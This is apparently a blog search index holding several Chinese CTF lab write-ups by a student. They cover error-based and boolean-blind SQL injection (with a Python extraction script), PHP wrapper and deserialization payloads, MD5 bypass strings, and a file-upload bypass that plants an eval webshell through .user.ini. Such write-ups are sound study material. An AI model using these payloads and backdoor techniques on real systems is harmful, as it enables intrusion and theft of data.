<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>寒假练习22和报错注入</title>
      <link href="test30/undefined-undefined.html"/>
      <url>test30/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天将报错注入方法扩展两个。  </p><h1 id="极客大挑战-2019-HardSQL-1"><a href="#极客大挑战-2019-HardSQL-1" class="headerlink" title="[极客大挑战 2019]HardSQL 1"></a>[极客大挑战 2019]HardSQL 1</h1><p>打开题目，发现是登陆题目。<br><img src="https://i.loli.net/2021/02/08/bAlqkn3FMRt9sLJ.png" alt="1.png"><br>尝试万能密码，发现不行，又尝试正常注入方式，发现有字符被过滤了。<br><img src="https://i.loli.net/2021/02/08/32qV5tzKNOnWRgE.png" alt="2.png"><br>于是进行一下fuzz模糊测试，看看有啥字符被过滤了。<br>经过测试后，发现union，空格等字符被过滤了，并且双写绕过也无法进行，只能考虑报错注入和布尔盲注了，可是布尔盲注也不行，因为无法判断页面回显是对还是错。而且相关函数还被过滤了。<br>那么手里只剩下报错注入了，可是这前学到的双查询的报错注入在这里也行不通，应该是相关函数被过滤了，那么只能用剩下的报错注入方法了。  </p><hr><h2 id="基于extractvalue-和updatexml-的报错注入"><a href="#基于extractvalue-和updatexml-的报错注入" class="headerlink" title="基于extractvalue()和updatexml()的报错注入"></a>基于extractvalue()和updatexml()的报错注入</h2><p>这两个函数分别也能完成报错注入，我们知道，报错注入的原理就是函数报错导致将数据库的信息给爆出来，从而达到sql注入的目的。在双查询注入中是count()这个聚合函数的报错，而这两个函数的报错同样可以达到这一目的。下面一一介绍。   </p><h3 id="Extractvalue-函数"><a href="#Extractvalue-函数" class="headerlink" title="Extractvalue() 函数"></a>Extractvalue() 函数</h3><p>Extractvalue() 函数使用XPath表示法从XML字符串中提取值。更准确地说，它是会从目标xml文件中返回所包含查询值的字符串<br>extractvalue(‘XML_ document’,’Xpath_string’)<br>extractvalue(‘目标xml文件名’,’在xml中查询的字符串’)<br>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。<br>正常查询的话第二个参数的位置格式 为 /xxx/xx/xx/xx 。即使查询不到也不会报错，比如  </p><blockquote><p>select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))</p></blockquote><p>这个就是查询anything文件中的/x/xx字符串，显然查询不到，但是结果会返回空却不会报错。<br>接下来如果我们这样构造：  </p><blockquote><p>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘~’,(select database()))))</p></blockquote><p>可以看到第二个参数的格式错了，这就导致了函数报错，而它的报错会将我们查询的值给报错出来，这就达到了目的。  </p><h3 id="Updatexml-函数"><a href="#Updatexml-函数" class="headerlink" title="Updatexml() 函数"></a>Updatexml() 函数</h3><p>这个函数和extractvalue基本相同，这是一个修改xml文件的函数，语法为：<br>updatexml(‘XML_ document’,’Xpath _string’,’New _value’)<br>updatexml(‘目标xml文件名’,’在xml中查询的字符串’,’替换后的值’)<br>它的报错方式和上面的相同，也是字符位置的格式不对导致报错，最后的参数可以随便写入，如下：  </p><blockquote><p>select username from security.user where id=1 and (updatexml(‘anything’,concat(‘~’,(select database())),’anything’))</p></blockquote><p>第二个参数格式不对导致报错。  </p><p>注：这两个函数报错查询的字符串长度有限，是32位。而双查询注入可以查询的字符长度是64位。如果要查询的字符串长度超过了限度，就要使用函数来分开查询，常见的有以下几种。  </p><p><strong>substring()**函数进行字符串截取。这个函数在布尔盲注中使用过。可以将字符串进行截取后返回。这个一次最多也只能截取32位。<br>**limit x,1</strong>逐一查询。在爆表，列，值时可以使用这个函数逐一返回而不是concat函数返回一列。<br>**{left(),right()}**这个函数可以从字符串左或者从字符串右开始读取相应位数的字符串。左右读到的合起来可以构成完整的。  </p><hr><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>了解了另外两种报错注入后我们来看这道题目。<br>我们使用Extractvalue()报错注入查询数据库名。空格被过滤使用（）来代替。  </p><blockquote><p>username=admin’^extractvalue(1,concat(~,(select(database()))))#&amp;password=aaa</p></blockquote><p>这里password也要输入，否则会报错（具体原因我还不知道）。<br>得到数据库名，看来这个报错注入行的通。<br><img src="https://i.loli.net/2021/02/08/dXC51mr4ap8Ttvj.png" alt="3.png"><br>爆表名。  </p><blockquote><p>admin’^extractvalue(1,concat(~,(select(group _concat(table _name))from(information _schema.tables)where((table _schema)like(‘geek’)))))#</p></blockquote><p>得到表名<br><img src="https://i.loli.net/2021/02/08/ec6VuG4kUXtqwd5.png" alt="4.png"><br>爆列名。  </p><blockquote><p>admin’^extractvalue(1,concat(~,(select(group _concat(column _name))from(information _schema.columns)where((table _name)like(‘H4rDsq1’)))))#</p></blockquote><p>注意这里使用like绕过=过滤。<br><img src="https://i.loli.net/2021/02/08/9byPsqfWKt1u6r3.png" alt="5.png"><br>爆flag。  </p><blockquote><p>admin’^extractvalue(1,concat(~,(select(password)from(geek.H4rDsq1))))#</p></blockquote><p><img src="https://i.loli.net/2021/02/08/4uNXpdoJVMzISt8.png" alt="6.png"><br>发现只有一半。<br>这里使用right函数来从右查看另一半。  </p><blockquote><p>admin’^extractvalue(1,concat(~,(select(right(password,30))from(geek.H4rDsq1))))#</p></blockquote><p><img src="https://i.loli.net/2021/02/08/yUvuoCzWcPstKie.png" alt="7.png"><br>拼起来就得到真正flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>通过这道题又多知道了两种报错注入方法，不得不感慨sql注入真的时方法万千，技巧也是多得多。<br>下面附上学习博客。<br><a href="https://blog.csdn.net/weixin_46145442/article/details/110254238?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161268582916780261991835%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161268582916780261991835&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-110254238.pc_search_result_cache&utm_term=extractvalue%25E5%2592%258Cupdatexml%25E6%258A%25A5%25E9%2594%2599%25E6%25B3%25A8%25E5%2585%25A5">sql注入中报错注入函数extractvalue和updatexml函数的原理及使用</a><br><a href="https://blog.csdn.net/qq_40989258/article/details/96978319?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161268582916780261991835%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161268582916780261991835&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-96978319.pc_search_result_cache&utm_term=extractvalue%25E5%2592%258Cupdatexml%25E6%258A%25A5%25E9%2594%2599%25E6%25B3%25A8%25E5%2585%25A5">基于extractvalue()和updatexml()的报错注入</a></p>]]></content>
      
      
      <categories>
          
          <category> test30 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习21和布尔盲注</title>
      <link href="test29/undefined-undefined.html"/>
      <url>test29/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天这道题是我目前做过的较难的sql注入题目了。这道题目用到了布尔盲注的知识。  </p><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World-1"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World-1" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World 1"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World 1</h1><p>打开这道题目，直接告诉我们flag就在flag表的flag的字段里面，我们只需要输入id就行了。<br><img src="https://i.loli.net/2021/02/07/7n5xsXIGVaRrQES.png" alt="61.png"><br>这直接给我弄蒙了，因为之前还没有见过这样的sql注入题，先尝试输入0，1，2等数字，发现在输入1，2数字时出现了不同回显，在输入0时报错。<br><img src="https://i.loli.net/2021/02/07/pXNxm5i1sqPyrUu.png" alt="63.png"><br><img src="https://i.loli.net/2021/02/07/JYuwIe1RPqvt5AZ.png" alt="62.png"><br><img src="https://i.loli.net/2021/02/07/LxzfGps4mj1XeBC.png" alt="64.png"><br>随后我又尝试按找常规方法进行查询，却发现被过滤了很多字符，导致查询后的界面都是一样的。<br><img src="https://i.loli.net/2021/02/07/OxpCMj9WucTXZDS.png" alt="65.png"><br>在尝试许多方式无果后，只能查看一下都有什么被过滤了。也就是fuzz测试。  </p><hr><h2 id="fuzz测试"><a href="#fuzz测试" class="headerlink" title="fuzz测试"></a>fuzz测试</h2><p>用我的话来讲，就是向系统发送大量恶意或随机的数据来测试系统的防护过滤，从而找到别的方式来绕过系统的过滤。<br>这个操作可以用软件进行，bp抓包软件就可以，和爆破密码的操作有点相像，他们二者的区别在于，爆破密码是为了找到密码，而fuzz测试是为了查看什么被过滤了，从而找到别的方法来绕过。<br>具体的方法我就不详细讲了，百度一下就有。下面附上一个教程。<br><a href="https://blog.csdn.net/hahazaizheli/article/details/96428290?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161263314316780299093685%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161263314316780299093685&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-96428290.pc_search_result_cache&utm_term=bp%25E6%258A%2593%25E5%258C%2585%25E5%25A6%2582%25E4%25BD%2595%25E8%25BF%259B%25E8%25A1%258Cfuzz">利用 Burpsuite Fuzz 实现 SQL 注入</a></p><hr><p>测试完后人傻了，发现有很多字符都被过滤了。<br><img src="https://i.loli.net/2021/02/07/Gw5Tq3Cghc7LZEF.png" alt="66.png"><br>482的都是被过滤的，其实union也被过滤了，只不过我这个字典里面没有这个字符，果然一个强大的字典还是很重要的。<br>可以看出来，我们之前用过的sql注入的方法在这里都行不通了。只能看一下别人的做法了。<br><strong>下面介绍一下新的sql注入方法——sql注入之布尔盲注</strong>  </p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息。<br>通过前面我们的尝试可以知道，当我们输入0和1时，页面返回的结果是不一样的，而且本题不支持联合查询，这就符合了布尔盲注的条件。那么具体是怎么样的注入呢？  </p><p>首先介绍相关的几个函数。  </p><blockquote><p>length()        返回字符串的长度<br>length(abc)        返回3，表示abc字符串长度为3  </p></blockquote><blockquote><p>substr()函数从特定位置开始的字符串返回一个给定长度的子字符串<br>substr()函数有三个参数，用法为：substr(str,pos,len)<br>str参数代表待截取的字符串<br>pos参数代表从什么位置开始截取<br>len参数表示字符串截取的长度<br>如select substr(‘hello’,1,1)返回的字符为“h”  </p></blockquote><blockquote><p>ascii()函数可以输出某个字符的ascii码值，ascii码共127个，此处注意ascii函数处理单个字符，如果是字符串则会处理第一个字符.<br>如select ascii(‘h’)返回104。  </p></blockquote><p>先介绍这三个函数，接着我们来看一下简单的布尔盲注的例子。<br>我们假设有一个数据库名为<strong>test</strong>。那么先给出下面的sql语句。  </p><blockquote><p>select user from test where id=1 and length((select database()))=4  </p></blockquote><p>这个语句很好理解，注入点是id=1，这里的关键字是<strong>and</strong>，我们知道只有and前后的条件都为真的时候，数据库才会输出结果。<br>那么我们可以看到and后面的length()函数，它里面有一个子查询，查询出数据库的名字并返回名字的长度，如果长度等于4，那么and前后都为真，就可以成功返回结果。<br>很明显，数据库test长度为4，所以可以返回结果。同理，如果我们把后面的判定改为length((select database()))&gt;3或者&gt;2都可以成功返回结果。但是改为&gt;4就不能返回结果了。<br>所以我们可以这样一个个的试，从&gt;1试到&gt;4，从而得到数据库的长度。  </p><p>经过上面的步骤，我们已经知道数据库的名字的长度，接下来就是它的名字是什么了。我们可以借鉴上面的思路，这样构造。  </p><blockquote><p>select user from test where id=1 and ascii(substr((select database()),1,1))=116  </p></blockquote><p>我们来看and后面的语句。先看里面的substr()函数，它截取了我们查询到的数据库名字的第一个字符，然后返回这第一个字符到ascii()函数中，我们知道，test第一个字符是t，它的ascii码是116。所以最终返回106这个数字，并将他和后面我们给出的条件判断，如果为真，那么and前后都为真，sql语句判定成功，也就返回结果。<br>很明显，我们这个语句是可以成功返回结果的，但是我们输入的是=115或者其他条件（&gt;116,&lt;116…..）那么它就无法成功返回结果。<br>而在其他题目中，我们是不知道数据库名字的，所以我们需要一个个的试，从1到这个字符的ascii码为止，而我们判断是否正确的方法就是观察页面的不同返回（true或false）。<br>同理，第二个字符也是这样得出来的。  </p><blockquote><p>select user from test where id=1 and ascii(substr((select database()),2,1))…..(填判断条件)   </p></blockquote><p>第三个，第四个字符也是如此。<br>这样我们就能查出数据库的名字了。<br>那么表名和列名，字段信息是不是都可以沿用这个思路呢？<br>是的。只需要稍作改动就可以了。下面给出如何查表名。   </p><p>求当前数据库存在的表的数量。  </p><blockquote><p>SELECT * from users WHERE id = 1 AND<br>(select count(table_ name) from information _ schema.tables where table_schema = database()) = 4(这个数量也是要一个个试来判断)</p></blockquote><p>求当前数据库表的表名长度。  </p><blockquote><p>SELECT * from users WHERE id = 1 AND (LENGTH((select table _ name from information _ schema.tables where table_schema = database() LIMIT 0,1)<br>)) = 6（这个长度也是要自己试出来）<br>LIMIT 0,1令表名一个个显示。之前的双查询注入使用到过。  </p></blockquote><p>求表名。  </p><blockquote><p>SELECT * from users WHERE id = 1<br>AND ASCII(SUBSTR(<br>(select table_ name FROM information _schema.tables<br>where table _schema = database() LIMIT 0,1),<br>1,1))&gt;…..(依旧是试)  </p></blockquote><p>列和字段信息都是这样的步骤。<br>可以看出布尔盲注的工作量是巨大的，因为要一个一个字符的试出来，长度和数量也要一个个的试，所以手工注入是不可能，所以布尔盲注一般都要用到脚本。再次感受到学会python的重要性。  </p><p>总结一下，布尔盲注的核心就是利用网页的不同的返回显示和几个函数叠加以及关键字and，在无法利用联合注入和网页没有回显位时通过网页不同的返回信息（真或者假）判断一个个所注入的字符，最后得到数据库信息。用到的这些函数都有替代的函数，百度即可。  </p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>那么回到这道题目，我们已经知道，当我们输入0和1时网页返回的信息不同，并且它并未过滤我们进行布尔盲注所需要的函数，虽然过滤了空格，但是可以使用左右括号绕过，所以我们可以这样构造sql语句。  </p><blockquote><p>1^if(ascii(substr((select(flag)from(flag)),{0},1))&gt;{1},0,1)</p></blockquote><p>这个语句中也有一些知识点。<br>首先是^这个异或符号，这是一个逻辑运算，运算法则简而言之就是两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），我们用它来代替and。<br>接着就是这个if语句，这是sql的三目运算语句。  </p><blockquote><p>if( 表达式1，表达式2，表达式3)<br>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p></blockquote><p>我们可以看到这个语句将会这样执行:我们从flag表的flag字段中查询出flag，并对flag的字符串进行一个个的截取。<br>如果flag的第一个字符的ascii码大于1，那么返回0，1^0为真，那么结果为1，也就是最终为id=1，输出glzjin wants a girlfriend的界面。<br>反之，如果flag第一个字符不大于1，那么返回1，1^0为假，结果为0，也就是id=0，输出报错界面。<br>我们将这个语句放到脚本中去，让判断的字符位和ascii码自己增加，这样就能容易的得到flag。<br>附上大佬的脚本。又感受了学好python的重要性。  </p><pre><code>import requests  import time  url=&quot;http://3820bdac-9613-4057-  bfb0-5d88973f7c2d.node3.buuoj.cn/index.php&quot;  flag=&quot;&quot;  for i in range(0,50):#flag长度，跑到一半可修改此值，继续跑后边的数据      print(i,&quot;:&quot;)      low=32      high=128      mid = (low+high)//2      while low&lt;=high:          #print(mid)      #for j in range(32,128):#可见字符长度          data=&#123;              &quot;id&quot;:&quot;1^if(ascii(substr((select(flag)from  (flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,0,1)&quot;.format(i,mid)              &#125;          t = requests.post(url,data=data)          #print(t.text)          if(&quot;glzjin wants a girlfriend&quot; in t.text):              low=mid+1              mid = (low+high)//2          else:              high=mid-1              mid = (low+high)//2      flag+=chr(high+1)      print(flag)      time.sleep(2) </code></pre><p>跑出来的结果。<br><img src="https://i.loli.net/2021/02/07/RhgtIY2n6yaE5vd.png" alt="67.png">  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>脚本的使用和布尔盲注的学习，还有fuzz测试来找到绕过方法。这道题还是比较难的。主要是还不会写脚本。<br>附上学习的相关博客。<br><a href="https://blog.csdn.net/qq_35569814/article/details/100175886?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161263055316780274123160%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161263055316780274123160&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-100175886.pc_search_result_cache&utm_term=sql%25E5%25B8%2583%25E5%25B0%2594%25E7%259B%25B2%25E6%25B3%25A8">SQL注入之布尔盲注</a><br><a href="https://blog.csdn.net/weixin_45146120/article/details/100104131?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161263358416780269891473%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161263358416780269891473&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-100104131.pc_search_result_cache&utm_term=%25E5%25B8%2583%25E5%25B0%2594%25E7%259B%25B2%25E6%25B3%25A8">布尔盲注详解</a>  </p>]]></content>
      
      
      <categories>
          
          <category> test29 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习20</title>
      <link href="test28/undefined-undefined.html"/>
      <url>test28/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天的题目是一道综合型的题目。  </p><h1 id="ZJCTF-2019-NiZhuanSiWei-1"><a href="#ZJCTF-2019-NiZhuanSiWei-1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei 1"></a>[ZJCTF 2019]NiZhuanSiWei 1</h1><p>打开题目，可以看到源码。<br><img src="https://i.loli.net/2021/02/05/pGI7dQRwKS8JNHF.png" alt="58.png"><br>分别有三个变量，都是以get方式传参。可以看到，我们必须要满足第一个if才能有后面的动作。  </p><blockquote><p>if(isset($text)&amp;&amp;(file_ get_contents($text,’r’)===”welcome to the zjctf”))</p></blockquote><p>这个if是先判断text是否为变量，然后读取text里面的内容并和welcome to the zjctf比较，如果text内容是这句话那么就可以接着进行。<br>一开始我想的是直接传参，构造/?text=welcome to the zjctf。<br>但是发现这样行不通，猜测是file_ get_contents（）函数是读取文件内容，而我们传参只是将值赋给了变量，这仍旧无法使函数读出text文件里有什么内容。<br>所以只能换另一种方法，用伪协议data://来写入字符串。关于伪协议可以查看我的另一篇博客笔记。这里简单说一下data://伪协议。  </p><hr><h2 id="伪协议data"><a href="#伪协议data" class="headerlink" title="伪协议data://"></a>伪协议data://</h2><p>使用条件allow _url _fopen ：on<br>allow _url _include：on<br>可以用该协议传递相应格式的数据。通常可以用来执行php代码<br>data://text/plain，<br>data://text/plain；base64，  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p><p><a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a>  </p></blockquote><hr><p>所以我们可以这样构造payload，把welcome to the zjctf写入text这个文件中。  </p><blockquote><p>?text=data://text/plain,welcome to the zjctf</p></blockquote><p>可以看到我们进入下一个界面。<br><img src="https://i.loli.net/2021/02/05/bRWcZJ21glnaCqx.png" alt="59.png"><br>根据开始的源码可以看到有一个uesless.php，可以确定这个是我们接下来要查看的文件。<br>看到有这样一个函数：include($file);那就是include（）包含漏洞了，直接上伪协议php://filter来读这个文件。  </p><blockquote><p>file=php://filter/read=convert.base64-encode/resource=useless.php  </p></blockquote><p>经过解码后得到这个php文件的源码。<br><img src="https://i.loli.net/2021/02/05/BT56PSd4AiI7L3j.png" alt="60.png"><br>可以看出来flag在flag.php里，我们如何读取这个文件呢，可以看到这个文件里有一个file_ get_contents（）函数，而里面的参数就是file，所以我们给file赋值flag.php就可以读取flag.php文件。<br>接着就是如何构造payload了，在这里我犯了个迷糊，文件里可以看到要序列化，一开始我直接来了个/?file=O:4:”Flag”:1:{s:4:”file”;s:8:”flag。php”;}却发现来了个not now，回头再看看源码发现漏了password这个变量。<br>因为file变量是被正则过滤了flag这个字符串的。所以我们不能通过file来上传我们的序列化。<br>所以我们应该再传参password。  </p><blockquote><p>/?password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p></blockquote><p>这样变量password经过反序列化函数后就可以读取flag了。<br>最后要按一下f12才能看到flag。  </p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目三个变量各有用处，text是开始的第一步要用到的，而file用来查看另一个php文件，password变量用来读取flag。<br>这道题目考了伪协议和序列化的知识，本身不难，重点是第一个data://伪协议的使用，之前我以为这个只能执行php代码，这道题让我知道了它还有写入的功能。确实长了见识。</p>]]></content>
      
      
      <categories>
          
          <category> test28 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习19</title>
      <link href="test27/undefined-undefined.html"/>
      <url>test27/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天又学到了一种特殊的sql绕过注入的方法。  </p><h1 id="BJDCTF2020-Easy-MD5-1"><a href="#BJDCTF2020-Easy-MD5-1" class="headerlink" title="[BJDCTF2020]Easy MD5 1"></a>[BJDCTF2020]Easy MD5 1</h1><p>打开题目，是一个登录页面。<br><img src="https://i.loli.net/2021/02/04/vr9YKLGBQIxnEzt.png" alt="19.png"><br>他让我们提交查询，可以猜想这是一个sql注入题，但是无论如何注入都没有回显和报错，这让我不知道如何进行下去，只能先抓包试一下。<br><img src="https://i.loli.net/2021/02/04/Qs6LvM8yREoYfhc.png" alt="20.png"><br>通过抓包的请求头里的信息可以看到有一个提示：<br>select * from ‘admin’ where password=md5($pass,true)<br>看来这个就是后台的sql语句了，可以看到我们输入的password经过了一个md5（）函数的加密，变成了别的语句。这也就解释了为什么我们输入的用于注入的语句都失效了。  </p><h2 id="md5函数"><a href="#md5函数" class="headerlink" title="md5函数"></a>md5函数</h2><p><img src="https://i.loli.net/2021/02/04/APICF3yWV5iRsb9.png" alt="21.png"><br>可以看到，md5函数计算出来的md5散列被规定成原始 16 字符二进制格式输出，那么这样会输出什么呢？我测试了一下。<br><img src="https://i.loli.net/2021/02/04/RZmJ7LVrh9uBMTw.png" alt="22.png"><br>好家伙，完全不能看，所以现在我们要做的就是找到一个字符串，当他经过这个md5函数后输出的字符串仍然可以用于sql注入。<br>到这个地方我就卡住了，只能看一下别人是如何做到的。<br>看了别人的wp发现可以写一个脚本来找到这样的字符串(tql)，我直接把这个字符串拿过来用了。  </p><blockquote><p>ffifdyop</p></blockquote><p>这个字符串在经过md5函数后就成了’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c这样的字符，再经过mysql的转化后成了’or’6]!r,b。<br>这样一来，后台的sql语句就成了这样的：  </p><blockquote><p>select * from ‘admin’ where password=’’or’6]!r,b’</p></blockquote><p>当or后面接的是一个数字的话，sql语句就变成：  </p><blockquote><p>select * from ‘admin’ where password=’’or true</p></blockquote><p>这也就是一个万能密码。所以我们可以成功登入。<br><img src="https://i.loli.net/2021/02/04/z6PEBMjLsOfqSu9.png" alt="23.png"><br>查看源码。<br><img src="https://i.loli.net/2021/02/04/kFKr3CvQa4H5es9.png" alt="24.png"><br>发现这里是一个md5的弱类型绕过。他要求我们输入的a，b变量 不相等，但是经过md5加密后相等。<br>如果我们输入构造这样的payload  </p><blockquote><p>/?a=QNKCDZO&amp;b=s878926199a  </p></blockquote><p>那么他们本来是不相等的，但是经过md5加密后的开头都是0e，而这样的开头在==比较下会被识别为科学计数法，也就是0，那么0=0为真，所以就能满足这两个条件。<br>这样的字符串有很多：240610708，aabg7XSs，aabC9RqS，<br>s878926199a。<br>接着我们进入下一个界面.<br><img src="https://i.loli.net/2021/02/04/w8XKuFZl6Q1SHym.png" alt="25.png"><br>发现这是一个强类型的绕过，如果我们再次输入上面的字符串，到了===的md5比较就没办法绕过了。因为===要求全等，也就说不能看作科学计数法。所以我们要用别的方法。<br>可以知道，当md5函数收到的不是字符串而是数组的时候，它并不会报错，而是会返回null，在强比较===里，null===null为真。这样就能绕过了。<br>所以我们这样构造：  </p><blockquote><p>param1[]=1&amp;param2[]=2</p></blockquote><p>这样post过去就能得到flag了。  </p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题最重要的一点还是绕过md5的sql注入，这个字符串确实对我来说还是不好找到的，后面的md5绕过其实网上有很多字符串，多积累在这个地方还是难不倒的。<br>附上md5绕过的讲解和积累。<br><a href="https://blog.csdn.net/EC_Carrot/article/details/109525162?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161242526816780255252599%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161242526816780255252599&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-7-109525162.pc_search_result_cache&utm_term=php+md5%E5%BC%BA%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">【PHP】MD5比较漏洞 弱比较、强比较、强碰撞</a></p>]]></content>
      
      
      <categories>
          
          <category> test27 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习18</title>
      <link href="test26/undefined-undefined.html"/>
      <url>test26/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天做了一道别样的上传文件题。   </p><h1 id="SUCTF-2019-CheckIn-1"><a href="#SUCTF-2019-CheckIn-1" class="headerlink" title="[SUCTF 2019]CheckIn 1"></a>[SUCTF 2019]CheckIn 1</h1><p>打开题目，发现让我们上传文件，毫不犹豫的写了个一句话木马上传抓包。<br><img src="https://i.loli.net/2021/02/04/WyhbxgpBLC5POAm.png" alt="13.png"><br>抓包后发现它过滤了php语言中的<?和?>符号，从以前做过的类似的题目积累可以知道这个符号用&lt;script来绕过，所以这样构造一句话木马。  </p><blockquote><p>&lt; script language=”php”&gt;eval($_REQUEST[shell]) </script >  </p></blockquote><p><img src="https://i.loli.net/2021/02/04/L2wu7oOjN59Y1aP.png" alt="14.png">  </p><p>接着它检测出来这个文件不是图片。我们先修改文件类型Content-Type，改为image/jpg。<br><img src="https://i.loli.net/2021/02/04/c9MqKxInWEv5bjP.png" alt="15.png"><br>发现它依旧检测出来不是图片，那么我们就在文件头加上GIF89a图片头。  </p><p><img src="https://i.loli.net/2021/02/04/pgKyNdIYWXStC4n.png" alt="16.png"><br>可以可看到成功上传，接着就是修改文件后缀，让他是一个php文件，只有这样才能执行我们的一句话代码。但是经过多次尝试可以知道它过滤了php的后缀，所以我们要想别的方法来上传。  </p><hr><h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h2><p>看了别人的wp后发现这道题要利用.user.ini文件来绕过对php后缀名的检测。<br>这个文件是php中的配置文件，搭过博客的可以知道配置文件管理着许多操作，而php.ini就是管理着所有php配置的配置文件，是php的默认配置文件，也就相当于admin用户。<br>但是.user.ini也是php配置文件，与默认的php.ini不同，这个是我们用户可以自定义的php.ini，当然，它可以操作的配置项相较于php.ini来说较少，也就相当于普通用户。<br>其中，利用.user.ini可以配置的项中有两个可以为我们所用。  </p><blockquote><p>auto_ append _ file<br>auto_ prepend _file</p></blockquote><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了include()函数。而auto_ append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：  </p><blockquote><p>auto_ prepend_file=01.gif</p></blockquote><p>01.gif就是要包含的文件。这样就可以使所有的php文件都包含一个01.gif的文件。<br>所以我们就可以利用这一点来构造后门，上传一句话木马。  </p><hr><p>知道道题原理后我们可以先上传一个.user.ini文件。  </p><blockquote><p>GIF89a<br>auto_ prepend_file=shell.gif<br><img src="https://s3.ax1x.com/2021/02/04/ylJyfP.md.png" alt="ylJyfP.md.png"><br>这样就实现了一个配置——使所有的php文件都包含一个shell.gif文件，这样就能解析我们上传的图片马。从而实现一句话木马功能。<br>接着再上传我们的图片马。<br><img src="https://s3.ax1x.com/2021/02/04/ylJROg.md.png" alt="ylJROg.md.png"><br>我们可以看到文件中有一个index.php文件，而我们的图片马也就包含在了这个php文件中，进而被解析，成为后门。<br>接下来用剑蚁连接或者直接在网址post数据就可以查看到flag了。  </p></blockquote><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题给出了另一种绕过上传文件限制的思路，当过滤了php的所有可以用的后缀名时，我们可以通过修改php的配置文件令所有php文件都包含我们上传的图片马，从而可以实现上传图片马被解析达到上传一句话木马的目的。<br>下面附上详细的讲解。<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">user.ini文件构成的PHP后门</a>  </p>]]></content>
      
      
      <categories>
          
          <category> test26 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入练习5-6</title>
